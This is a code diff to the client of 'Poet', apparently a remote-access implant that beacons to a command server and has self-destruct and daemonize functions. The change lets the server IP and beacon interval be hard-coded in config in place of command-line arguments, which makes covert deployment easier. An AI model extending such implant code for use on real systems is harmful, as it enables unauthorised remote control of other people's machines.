@@ -118,10 +118,12 @@ def get_args():
     """ Parse arguments and return dictionary. """
 
     parser = argparse.ArgumentParser()
-    parser.add_argument('host', metavar='IP', type=str, help='Poet Server')
-    parser.add_argument('interval', metavar='INTERVAL', type=int,
-                        help='Beacon Interval, in seconds. Default: 600',
-                        nargs='?', default=600)
+    if CFG.SERVER_IP is None:
+        parser.add_argument('server', metavar='IP', type=str, help='Poet Server')
+    if CFG.BEACON_INTERVAL is None:
+        parser.add_argument('interval', metavar='INTERVAL', type=int,
+                            help='Beacon Interval, in seconds. Default: 600',
+                            nargs='?', default=600)
     parser.add_argument('-p', '--port')
     parser.add_argument('--debug', action="store_true",
                         help="show debug messages. implies --no-daemon")
@@ -157,8 +159,7 @@ def is_active(host, port):
         if f.code == 200:
             return True
     except urllib2.URLError:
-        pass
-    return False
+        return False
 
 
 def selfdestruct():
@@ -204,6 +205,10 @@ def daemonize():
 def main():
     global args
     args = get_args()
+    if CFG.SERVER_IP is not None:
+        args.server = CFG.SERVER_IP
+    if CFG.BEACON_INTERVAL is not None:
+        args.interval = CFG.BEACON_INTERVAL
 
     # dynamically load all modules. needs to be before daemonize because it
     # needs to be able to open itself to find modindex.txt in package.c
@@ -226,7 +231,7 @@ def main():
             # fatal
             sys.exit(0)
 
-    HOST = args.host
+    HOST = args.server
     PORT = int(args.port) if args.port else 443
 
     debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))
